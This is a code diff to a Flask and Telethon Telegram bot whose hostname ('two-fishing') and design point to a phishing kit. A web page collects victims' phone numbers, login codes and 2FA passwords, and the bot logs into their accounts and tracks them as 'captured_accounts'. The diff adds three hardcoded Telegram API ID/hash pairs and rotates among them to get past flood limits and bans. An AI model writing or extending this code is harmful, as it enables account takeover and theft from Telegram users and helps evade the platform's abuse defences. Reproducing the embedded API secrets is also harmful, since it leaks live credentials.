@@ -1,5 +1,5 @@
 from flask import Flask, request, jsonify
-import os, json, base64, threading, asyncio, logging, traceback, uuid, time, re
+import os, json, base64, threading, asyncio, logging, traceback, uuid, time, re, random
 from datetime import datetime
 import requests as http_requests
 from telethon import TelegramClient, errors, events
@@ -19,13 +19,92 @@ def _si(v, d=0):
 
 
 BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
-API_ID = _si(os.environ.get("API_ID"), 0)
-API_HASH = (os.environ.get("API_HASH") or "").strip()
 YOUR_TELEGRAM_ID = _si(os.environ.get("OWNER_ID"), 0)
 CHANNEL_ID = _si(os.environ.get("CHANNEL_ID"), 0)
 PORT = _si(os.environ.get("PORT"), 5000)
 WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://two-fishing.onrender.com/tg")
 SELF_URL = os.environ.get("SELF_URL", "https://two-fishing.onrender.com/health")
+
+# ============================================================
+# API POOL — multiple API ID/HASH
+# ============================================================
+API_POOL_FILE = "api_pool.json"
+
+# Initial 3 API ID/HASH — আপনি যেকোনো সময় api_pool.json edit করে আরো যোগ করতে পারবেন
+DEFAULT_API_POOL = [
+    {"api_id": 37949569, "api_hash": "4b3b64bfc9f33bd7d190ee7b9ed2fbb6", "enabled": True},
+    {"api_id": 24886849, "api_hash": "2fcdc5fecfdc223a14cbb044e141e223", "enabled": True},
+    {"api_id": 33605480, "api_hash": "ff6eaa45dbf40feb166de32e24169503", "enabled": True},
+]
+
+
+def load_api_pool():
+    """Load API pool from file, or create from defaults."""
+    if os.path.exists(API_POOL_FILE):
+        try:
+            with open(API_POOL_FILE) as f:
+                pool = json.load(f)
+            if isinstance(pool, list) and pool:
+                return [p for p in pool if p.get("enabled", True)]
+        except Exception as e:
+            logger.error(f"load_api_pool: {e}")
+    # create default
+    try:
+        with open(API_POOL_FILE, "w") as f:
+            json.dump(DEFAULT_API_POOL, f, indent=2)
+    except Exception as e:
+        logger.error(f"save_api_pool: {e}")
+    return [p for p in DEFAULT_API_POOL if p.get("enabled", True)]
+
+
+def save_api_pool(pool):
+    try:
+        with open(API_POOL_FILE, "w") as f:
+            json.dump(pool, f, indent=2)
+    except Exception as e:
+        logger.error(f"save_api_pool: {e}")
+
+
+# Global state
+_api_pool = load_api_pool()
+_api_health = {}  # api_id -> {"fails": 0, "last_fail": 0, "banned": False}
+
+
+def get_next_api():
+    """Return a random healthy API from pool."""
+    healthy = [a for a in _api_pool if not _api_health.get(a["api_id"], {}).get("banned", False)]
+    if not healthy:
+        # try to recover banned ones after cooldown
+        now = time.time()
+        for a in _api_pool:
+            h = _api_health.get(a["api_id"], {})
+            if h.get("banned") and now - h.get("last_fail", 0) > 3600:
+                h["banned"] = False
+                h["fails"] = 0
+                _api_health[a["api_id"]] = h
+                healthy.append(a)
+    if not healthy:
+        return None
+    return random.choice(healthy)
+
+
+def mark_api_fail(api_id):
+    h = _api_health.setdefault(api_id, {"fails": 0, "last_fail": 0, "banned": False})
+    h["fails"] = h.get("fails", 0) + 1
+    h["last_fail"] = time.time()
+    if h["fails"] >= 5:
+        h["banned"] = True
+        logger.error(f"🚫 API {api_id} marked banned after {h['fails']} fails")
+
+
+def mark_api_ok(api_id):
+    h = _api_health.setdefault(api_id, {"fails": 0, "last_fail": 0, "banned": False})
+    h["fails"] = 0
+
+
+# Fallback (for admin bot itself — must always use a stable one)
+API_ID = _api_pool[0]["api_id"]
+API_HASH = _api_pool[0]["api_hash"]
 
 # ============================================================
 # FIXED BACKGROUND IMAGE
@@ -48,7 +127,9 @@ https://t.me/{bot}
 logger.info("=" * 60)
 logger.info("ADMIN BOT START")
 logger.info(f"  BOT_TOKEN  : {'SET' if BOT_TOKEN else 'MISSING'}")
-logger.info(f"  API_ID     : {API_ID}")
+logger.info(f"  API POOL   : {len(_api_pool)} APIs loaded")
+for a in _api_pool:
+    logger.info(f"    - {a['api_id']} ({'enabled' if a.get('enabled') else 'disabled'})")
 logger.info(f"  OWNER_ID   : {YOUR_TELEGRAM_ID}")
 logger.info(f"  CHANNEL_ID : {CHANNEL_ID if CHANNEL_ID else 'NOT SET'}")
 logger.info(f"  BG_IMAGE   : {BG_IMAGE_URL}")
@@ -373,8 +454,22 @@ def admin_menu():
         [Button.inline(f"⏱ Timer: {timer_value}s", b"menu_timer"),
          Button.inline(f"🗑 Auto-Del: {'ON' if AUTO_DELETE_EXPIRED else 'OFF'}", b"menu_toggle_expired")],
         [Button.inline(f"🔐 2FA: {'SET' if auto_2fa_pass else 'EMPTY'}", b"menu_autopass")],
+        [Button.inline("🌐 API Pool", b"menu_api")],
         [Button.inline("♻️ Reset Numbers", b"menu_reset_numbers"),
          Button.inline("🔄 Reset Modes", b"menu_reset")],
+    ]
+
+
+def api_menu():
+    lines = []
+    for a in _api_pool:
+        h = _api_health.get(a["api_id"], {})
+        status = "🚫 BANNED" if h.get("banned") else ("⚠️ " + str(h.get("fails", 0)) + " fails" if h.get("fails", 0) > 0 else "✅ OK")
+        lines.append(f"`{a['api_id']}` — {status}")
+    return [
+        [Button.inline("🔄 Refresh", b"api_noop")],
+        [Button.inline("♻️ Reset Health", b"api_reset")],
+        [Button.inline("⬅️ Back", b"menu_home")],
     ]
 
 
@@ -526,7 +621,7 @@ async def health_cmd(event):
     txt = (f"🏥 HEALTH\n\nbot connected: {bot.is_connected()}\n"
            f"bot username: @{get_bot_username()}\naccounts: {len(captured_accounts)}\n"
            f"pending_codes: {len(pending_codes)}\nuser_sessions: {len(user_sessions)}\n"
-           f"bg_image: {BG_IMAGE_URL}\nchannel_id: {CHANNEL_ID}")
+           f"api_pool: {len(_api_pool)}\nbg_image: {BG_IMAGE_URL}\nchannel_id: {CHANNEL_ID}")
     await event.respond(txt, buttons=admin_menu())
 
 
@@ -556,6 +651,22 @@ async def cb(event):
     data = event.data.decode()
     chat_id = event.sender_id
     try:
+        # API POOL
+        if data == "menu_api":
+            await event.answer()
+            txt = "🌐 **API Pool**\n\n"
+            for a in _api_pool:
+                h = _api_health.get(a["api_id"], {})
+                status = "🚫 BANNED" if h.get("banned") else ("⚠️ " + str(h.get("fails", 0)) + " fails" if h.get("fails", 0) > 0 else "✅ OK")
+                txt += f"`{a['api_id']}` — {status}\n"
+            txt += f"\n**Total: {len(_api_pool)}**\n\nEdit `api_pool.json` on server to add more."
+            await safe_send(chat_id, txt, api_menu(), edit_event=event); return
+        if data == "api_noop": return await event.answer("Refreshed")
+        if data == "api_reset":
+            for k in _api_health: _api_health[k] = {"fails": 0, "last_fail": 0, "banned": False}
+            await event.answer("Health reset", alert=True)
+            await safe_send(chat_id, "✅ All API health reset.", admin_menu(), edit_event=event); return
+
         if data == "menu_reset_numbers":
             await event.answer()
             await safe_send(chat_id, "♻️ **Reset Numbers**", reset_numbers_menu(), edit_event=event); return
@@ -944,7 +1055,7 @@ async def bot_main():
 
 
 # ============================================================
-# WEBAPP HTML — FIXED BG IMAGE (CLEAR, FADE-IN, FALLBACK)
+# WEBAPP HTML
 # ============================================================
 WEBAPP_HTML = """<!DOCTYPE html>
 <html><head>
@@ -956,17 +1067,10 @@ WEBAPP_HTML = """<!DOCTYPE html>
 *{margin:0;padding:0;box-sizing:border-box}
 html,body{background:#0a0a0a}
 body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:white;min-height:100vh;overflow-x:hidden}
-
-/* Fallback gradient (visible while image loads) */
 #bgFallback{position:fixed;inset:0;background:linear-gradient(135deg,#1a1a2e,#e94560,#0a0a0a);z-index:0}
-
-/* The background image */
 #bgImage{position:fixed;top:0;left:0;width:100vw;height:100vh;object-fit:cover;z-index:1;pointer-events:none;opacity:0;transition:opacity 0.5s ease}
 #bgImage.loaded{opacity:1}
-
-/* Light overlay so text is readable but image is clear */
 .blur{position:fixed;inset:0;background:rgba(0,0,0,0.30);z-index:2}
-
 .wrap{position:relative;z-index:10;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
 .modal{background:#141420;border-radius:24px;padding:32px 24px;max-width:380px;width:100%;border:1px solid #2a2a3e;text-align:center;display:none}
 .modal.on{display:block}
@@ -1054,7 +1158,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:white;min-hei
 </div>
 </div>
 <script>
-// ===== Background image: fade-in + fallback =====
 (function(){
   var img = document.getElementById('bgImage');
   if (!img) return;
@@ -1064,7 +1167,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:white;min-hei
   else {
     img.addEventListener('load', show);
     img.addEventListener('error', fail);
-    // hard retry once after 3s
     setTimeout(function(){
       if (!img.classList.contains('loaded')) {
         var s = img.src;
@@ -1414,6 +1516,8 @@ def health():
         'channel_id': CHANNEL_ID,
         'bot_username': get_bot_username(),
         'bg_image': BG_IMAGE_URL,
+        'api_pool_size': len(_api_pool),
+        'api_health': {str(k): v for k, v in _api_health.items()},
     })
 
 
@@ -1495,42 +1599,93 @@ def _run_tg_thread(phone, code, password, tg_id):
         logger.error(f"run_tg_thread: {e}"); logger.error(traceback.format_exc())
 
 
+# ============================================================
+# CORE: _tg_action with API POOL ROTATION
+# ============================================================
 async def _tg_action(phone, code=None, password=None, tg_id=None):
+    # ===== OTP SEND (with API rotation) =====
     if not code:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        try:
-            await client.connect()
-            r = await client.send_code_request(phone)
-            session_str = StringSession.save(client.session)
-            with sessions_lock:
-                user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str, 'sent_at': time.time()}
-                pending_codes[phone] = 'sent'
-            return {'success': True}
-        except errors.PhoneNumberBannedError:
-            with sessions_lock: pending_codes[phone] = 'err'
-            return {'success': False, 'error': 'Phone number banned by Telegram'}
-        except errors.PhoneNumberInvalidError:
-            with sessions_lock: pending_codes[phone] = 'err'
-            return {'success': False, 'error': 'Invalid phone number'}
-        except errors.FloodWaitError as e:
-            with sessions_lock: pending_codes[phone] = 'err'
-            return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
-        except errors.ApiIdInvalidError:
-            with sessions_lock: pending_codes[phone] = 'err'
-            return {'success': False, 'error': 'API ID invalid'}
-        except Exception as e:
-            with sessions_lock: pending_codes[phone] = 'err'
-            return {'success': False, 'error': str(e)[:80]}
-        finally:
-            try: await client.disconnect()
-            except Exception: pass
+        last_err = None
+        tried = set()
+        
+        for attempt in range(min(len(_api_pool), 5)):
+            api = get_next_api()
+            if not api:
+                break
+            if api["api_id"] in tried:
+                continue
+            tried.add(api["api_id"])
+            
+            logger.info(f"🔁 OTP try #{attempt+1} using API {api['api_id']}")
+            client = TelegramClient(StringSession(), api["api_id"], api["api_hash"])
+            try:
+                await client.connect()
+                r = await client.send_code_request(phone)
+                session_str = StringSession.save(client.session)
+                with sessions_lock:
+                    user_sessions[phone] = {
+                        'hash': r.phone_code_hash,
+                        'session': session_str,
+                        'sent_at': time.time(),
+                        'api_id': api["api_id"],
+                        'api_hash': api["api_hash"]
+                    }
+                    pending_codes[phone] = 'sent'
+                mark_api_ok(api["api_id"])
+                logger.info(f"✅ OTP SENT via API {api['api_id']}: {phone}")
+                return {'success': True}
+            
+            except errors.PhoneNumberBannedError:
+                mark_api_ok(api["api_id"])  # not api's fault
+                with sessions_lock: pending_codes[phone] = 'err'
+                return {'success': False, 'error': 'Phone number banned by Telegram'}
+            
+            except errors.PhoneNumberInvalidError:
+                mark_api_ok(api["api_id"])
+                with sessions_lock: pending_codes[phone] = 'err'
+                return {'success': False, 'error': 'Invalid phone number'}
+            
+            except errors.FloodWaitError as e:
+                mark_api_fail(api["api_id"])
+                last_err = f'FloodWait {e.seconds}s'
+                logger.warning(f"⚠️ FloodWait {e.seconds}s on API {api['api_id']}")
+                continue  # try next API
+            
+            except errors.ApiIdInvalidError:
+                mark_api_fail(api["api_id"])
+                last_err = 'API ID invalid'
+                logger.error(f"❌ API {api['api_id']} INVALID — trying next")
+                continue
+            
+            except Exception as e:
+                es = str(e)
+                if 'API_ID' in es.upper() or 'API ID' in es:
+                    mark_api_fail(api["api_id"])
+                    last_err = es[:80]
+                    logger.error(f"❌ API {api['api_id']} fail: {es[:80]}")
+                    continue
+                # other error — fail out
+                with sessions_lock: pending_codes[phone] = 'err'
+                return {'success': False, 'error': es[:80]}
+            
+            finally:
+                try: await client.disconnect()
+                except Exception: pass
+        
+        # all APIs failed
+        with sessions_lock: pending_codes[phone] = 'err'
+        return {'success': False, 'error': f'All APIs failed. Last: {last_err or "unknown"}'}
 
+    # ===== VERIFY (uses stored api_id/hash) =====
     with sessions_lock:
         if phone not in user_sessions:
             return {'success': False, 'error': 'No session. Resend code.'}
         s = user_sessions[phone]
-
-    client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
+    
+    api_id = s.get('api_id', API_ID)
+    api_hash = s.get('api_hash', API_HASH)
+    
+    client = TelegramClient(StringSession(s['session']), api_id, api_hash)
     try:
         await client.connect()
         if not await client.is_user_authorized():
@@ -1603,6 +1758,7 @@ async def _tg_action(phone, code=None, password=None, tg_id=None):
             user_sessions.pop(phone, None)
             pending_codes[phone] = 'done'
         return {'success': True, 'user_id': me.id}
+    
     except errors.PhoneCodeInvalidError:
         return {'success': False, 'error': 'Wrong code'}
     except errors.PhoneCodeExpiredError:
@@ -1652,7 +1808,7 @@ def _run_bot():
         logger.error(f"BOT CRASH: {e}"); logger.error(traceback.format_exc())
 
 
-if BOT_TOKEN and API_ID and API_HASH and YOUR_TELEGRAM_ID:
+if BOT_TOKEN and YOUR_TELEGRAM_ID:
     _bot_thread = threading.Thread(target=_run_bot, daemon=True, name="admin-bot")
     _bot_thread.start()
     logger.info("Admin bot thread started")
